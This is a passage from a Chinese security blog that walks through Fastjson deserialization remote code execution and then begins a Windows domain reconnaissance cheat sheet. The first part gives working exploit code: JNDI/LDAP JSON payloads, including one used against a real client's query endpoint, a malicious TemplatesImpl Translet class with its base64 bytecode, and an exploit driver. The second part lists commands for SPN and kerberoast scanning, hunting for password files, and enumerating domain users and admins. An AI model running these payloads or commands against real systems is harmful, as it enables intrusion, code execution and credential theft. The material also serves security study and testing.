<p>可以看到setDataSourceName()方法调用了父类中的setDataSourceName()方法，传入var1参数。</p>
<p><strong>BaseRowSet.setDataSourceName</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">          dataSource = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         dataSource = name;</span><br><span class="line">      &#125;</span><br><span class="line">      URL = <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>父类中的SetDataSourceName()方法将datasource设置为传入的参数</p>
<p><strong>jdbcRowSetimpl.setAutoCommit</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">         <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>setAutoCommit()方法调用了connect()方法</p>
<p><strong>jdbcRoeSetimpl.connect</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在connect()方法中使用lookup()调用getDataSourceName()方法，获取通过setDataSourceName()方法设置的DataSource，所以Sourcename是可以控制的。我们可以将Sourcename设置加载恶意类，从而利用造成命令执行。</p>
<p><strong>RCE</strong></p>
<p>我们可以将DataSourcename设置为搭建的ldap和RMI服务，这里使用的是JNDIExploit工具</p>
<p>[工具下载地址](<a href="https://github.com/Jeromeyoung/JNDIExploit-1">Jeromeyoung&#x2F;JNDIExploit-1: 一款用于JNDI注入利用的工具，大量参考&#x2F;引用了Rogue JNDI项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。 (github.com)</a>)</p>
<p><strong>Demo</strong></p>
<p>将 datasourcename设置为开启的ldap服务应用类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI_Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 高版本的JDK，需要设置一下，低版本的可以忽略，参考JNDI注入文章</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        String json = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/1vehsr\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>使用JNDIEXPLOIT工具开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java   -jar   JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar     -A 127.0.0.1     -C &quot;calc&quot;</span><br><span class="line"></span><br><span class="line"> -A     指定监听地址</span><br><span class="line"> -C     执行的命令</span><br></pre></td></tr></table></figure>

<p>可以看到命令成功执行</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211110110216214.png" class title="image-20211110110216214">





<h4 id="实战利用-这里的fastjson版本为1-2-21"><a href="#实战利用-这里的fastjson版本为1-2-21" class="headerlink" title="实战利用(这里的fastjson版本为1.2.21)"></a>实战利用(这里的fastjson版本为1.2.21)</h4><hr>
<p>在做某基金项目时公司前辈使用fastjson1.2.24反序列化实现了RCE，所以下来对该漏洞进行了复现</p>
<p>这是漏洞触发点，可以看到是个查询接口</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111211609793.png" class title="image-20211111211609793">



<p>该查询接口发现使用query参数(query_list)，将query参数格式设置为错误格式，比如删除其中的中括号或花括号</p>
<p>这里删掉啦最后的花括号，可以看到报错返回fastjson版本为1.2.41</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111212405478.png" class title="image-20211111212405478">



<p>这里使用dnslog来验证是否命令执行成功</p>
<p>在dnslog平台上获取域名</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111215010686.png" class title="image-20211111215010686">



<p>将JNDIExpoit工具放到自己的公网服务器上，并开启IDAP和RMI服务(注意jdk版本)</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111220410004.png" class title="image-20211111220410004">



<p>构造query参数加载jdbcSetRowimpl类设置dataSourceName为指定的LDAP服务或者RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7B%22ss%22:%7B%22@type%22:%22com.alibaba.fastjson.JSONObject%22,%7B%0A%20%20%20%20%22a%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22java.lang.Class%22,%0A%20%20%20%20%20%20%20%22val%22:%22com.sun.rowset.jdbcRowSetimpl%22%0A%20%20%20%20%7D,%0A%20%20%20%20%22b%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22com.sun.rowset.jdbcRowSetimpl%22,%0A%20%20%20%20%20%20%20%22dataSourceName%22:%22idap://公网服务器ip地址:1389/do9ouu%22,%0A%20%20%20%20%20%20%20%22autoCommit%22:true%0A%20%20%20%20%7D%0A%7D%7D</span><br></pre></td></tr></table></figure>



<p>构造的json利用poc如下:</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221213814.png" class title="image-20211111221213814">



<p>发包后可看到dnslog上有DNS解析，证明命令执行成功</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221622063.png" class title="image-20211111221622063">



<p>命令执行也可以设置为反弹shell造成RCE。</p>
<h3 id="Templatesimpl利用链"><a href="#Templatesimpl利用链" class="headerlink" title="Templatesimpl利用链"></a>Templatesimpl利用链</h3><hr>
<h4 id="利用流程-1"><a href="#利用流程-1" class="headerlink" title="利用流程"></a><strong>利用流程</strong></h4><p>思路如下；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 自定义构造恶意类TempletaPoc继承AbstractTranslet类，通过javassist字节码编程将恶意类TempletaPoc转换成字节码并对其进行base64编码。</span><br><span class="line"></span><br><span class="line">2. 构造TemplatesImpl类的json数据，将TempletaPoc类的字节码设置为_bytecodes属性的取值中，当json数据在还原成TemplatesImpl对象时会加载_bytecodes属性。此时，就会触发前面设置的TempletaPoc类字节码并实例化，执行构造的命令。</span><br></pre></td></tr></table></figure>



<p>构造恶意类TemplatePoc类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Templetapoc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得注意的是，需要导入com.sun.org.apache包，可通过在pom.xml配置文件下添加依赖下载资源导入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;com.sun.org.apache&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;jaxp-ri&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;1.4&lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<p>使用javac.exe将java源代码编译成字节码，成功.class文件</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112112456462.png" class title="image-20211112112456462">



<p>我们使用工具查看编译成的二进制文件(hexdump或者一些编辑器)</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112142345785.png" class title="image-20211112142345785">



<p>将上面编译得到的字节码进行base64编码加密，加载编译得到的class文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loadclasstest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Users\\Administrator\\IdeaProjects\\fastjson_Demo\\src\\main\\java\\org\\example\\Templetapoc.class&quot;</span>));</span><br><span class="line">        String bytecode = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(bytecode);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Base64编码；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEAEFRlbXBsZXRhcG9jLmphdmEMAAkACgcAIQwAIgAjAQAEY2FsYwwAJAAlAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJgAKAQAXb3JnL2V4YW1wbGUvVGVtcGxldGFwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABYADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAaAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAA4ACQARAAwADwANABAAEQASABMAAAAHAAJMBwAUBAABABUAAAACABY=</span><br></pre></td></tr></table></figure>



<p>构造测试类，设置Templatesimpl类中的_bytecodes属性为Templetapoc,如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> org.example.User;</span><br><span class="line"><span class="keyword">import</span> org.example.Templetapoc;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Teamplatesimpl_test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> CannotCompileException,NotFoundException,IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//设置Base64编码的字节码</span></span><br><span class="line">        String byteCode = <span class="string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEAEFRlbXBsZXRhcG9jLmphdmEMAAkACgcAIQwAIgAjAQAEY2FsYwwAJAAlAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJgAKAQAXb3JnL2V4YW1wbGUvVGVtcGxldGFwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABYADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAaAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAA4ACQARAAwADwANABAAEQASABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>;</span><br><span class="line">        <span class="comment">//构造恶意的json字符串</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+byteCode+<span class="string">&quot;\&quot;],&quot;</span> + <span class="string">&quot;&#x27;_name&#x27;:T,&quot;</span> + <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> + <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object object = JSON.parseObject(payload,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下面我们来看下上面代码中的payload构造；</p>
<p>@type：当fastjson根据json数据对TemplatesImpl类进行反序列化时，会调用TemplatesImpl类的getOutputProperties方法触发利用链加载_bytecodes属性中的TempletaPoc类字节码并实例化，执行RCE代码。</p>
<p>_bytecodes：Templatesimpl类的属性，主要是承载恶意类TempletaPoc的字节码。就是把Templatepoc类先编译成字节码，然后再使用base64编码。</p>
<p>_name：关于_name属性，在调用TemplatesImpl利用链的过程中，会对_name进行不为null的校验。这里的_name取值为承载恶意类字节码，也就是前面的Templatepoc类。</p>
<p>_tfactory：在调用TemplatesImpl利用链时，defineTransletClasses方法内部会通过_tfactory属性调用一个getExternalExtensionsMap方法，如果_tfactory属性为null则会抛出异常，无法根据_bytecodes属性的内容加载并实例化恶意类。 </p>
<p>outputProperties：json数据在反序列化时会调用TemplatesImpl类的getOutputProperties方法触发利用链，可以理解为outputProperties属性的作用就是为了调用getOutputProperties方法。</p>
<p>运行结果；</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211112205132938.png" class title="image-20211112205132938">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">值得注意的是:</span><br><span class="line">需要开启Feature.SupportNonPublicField，实战中不适用</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>开发框架漏洞</category>
        <category>Fastjson</category>
      </categories>
      <tags>
        <tag>-web漏洞 -框架漏洞 -反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows信息收集</title>
    <url>/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/</url>
    <content><![CDATA[<h1 id="Windows信息收集list"><a href="#Windows信息收集list" class="headerlink" title="Windows信息收集list"></a>Windows信息收集list</h1><h2 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h2><p>SPN即(Service Principal Names)服务器主体名称，可以理解为一个服务(如HTTP，MSSQL)等的唯一标识符，<strong>在加入域时是自动注册的</strong>，如果想使用<code>Kerberos</code>协议来认证服务，那么必须正确配置SPN。</p>
<h3 id="SPN扫描的优势"><a href="#SPN扫描的优势" class="headerlink" title="SPN扫描的优势"></a>SPN扫描的优势</h3><p>在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以很难被检测出来。且不需要进行大范围扫描，效率高，不需要与目标主机建立链接，可以隐蔽的同时快速发现内网中的资产以及服务。</p>
<h3 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h3><p>普通域用户即可查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805185944585.png" class title="image-20210805185944585">

<h3 id="kerberoast工具包"><a href="#kerberoast工具包" class="headerlink" title="kerberoast工具包"></a>kerberoast工具包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805194526691.png" class title="image-20210805194526691">

<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805194541996.png" class title="image-20210805194541996">

<p>可以用于快速定位<code>域控</code>，以及排查内网中存在的<code>服务及主机</code>。</p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano -p tcp</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805191040466.png" class title="image-20210805191040466">

<p>利用netstat -ano命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息:</p>
<ul>
<li><p>如果通信信息是入流量，则可以获取到跳板机&#x2F;堡垒机、管理员的PC来源IP、本地web应用端口等信息</p>
</li>
<li><p>如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息</p>
</li>
</ul>
<h2 id="web配置文件"><a href="#web配置文件" class="headerlink" title="web配置文件"></a>web配置文件</h2><p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /s /m &quot;password&quot; *.*</span><br><span class="line">下面是常用应用的默认配置路径：</span><br><span class="line"></span><br><span class="line">Tomcat:</span><br><span class="line">CATALINA_HOME/conf/tomcat-users.xml</span><br><span class="line"></span><br><span class="line">Apache:</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">Nginx:</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">Wdcp:</span><br><span class="line">/www/wdlinux/wdcp/conf/mrpw.conf</span><br><span class="line"></span><br><span class="line">Mysql:</span><br><span class="line">mysql\data\mysql\user.MYD</span><br></pre></td></tr></table></figure>

<h2 id="域网络对象信息"><a href="#域网络对象信息" class="headerlink" title="域网络对象信息"></a>域网络对象信息</h2><h3 id="判断是否有域环境"><a href="#判断是否有域环境" class="headerlink" title="判断是否有域环境"></a>判断是否有域环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all 	  		 #查看网关 IP 地址、DNS 的 IP 地址、本地地址是否和 DNS 服务器为同一网段、域名</span><br><span class="line">nslookup 域名    		   #通过反向解析查询命令 nslookup 来解析域名的 IP 地址。使用解析出来的 IP 地址进行对比，判断域控制器和 DNS 服务器是否在同一台服务器上</span><br><span class="line">systeminfo        		 #域显示不为workgroup 说明有域</span><br><span class="line">net config workstation   #工作站域 DNS 名称显示域名（如果显示为 WORKGROUP，则表示非域环境）。登录域表明当前用户是域用户登录还是本地用户登录。</span><br><span class="line">net time /domain  		 #判断主域。存在域，但是当前用户不是域用户，提示拒绝访问；存在域，是域用户，提示成功完成；不存在域，提示找不到域控制器。</span><br></pre></td></tr></table></figure>

<p>&#x2F;domain的命令使用条件：当前机器是域机器，当前用户是域用户</p>
<h3 id="查询域用户"><a href="#查询域用户" class="headerlink" title="查询域用户"></a>查询域用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">net group &quot;domain users&quot; /domain</span><br><span class="line">net user 域用户 /domain	  		  		  获取域用户的详细信息</span><br><span class="line">net user /domain 域用户 12345678 	  		  修改域用户密码，需要域管理员权限</span><br><span class="line">net accounts /domain                         查询域用户账户等信息</span><br></pre></td></tr></table></figure>

<h3 id="查询域管理员"><a href="#查询域管理员" class="headerlink" title="查询域管理员"></a>查询域管理员</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>

<h3 id="查询域控制器、定位域控制器"><a href="#查询域控制器、定位域控制器" class="headerlink" title="查询域控制器、定位域控制器"></a>查询域控制器、定位域控制器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<h3 id="查看域内组"><a href="#查看域内组" class="headerlink" title="查看域内组"></a>查看域内组</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>

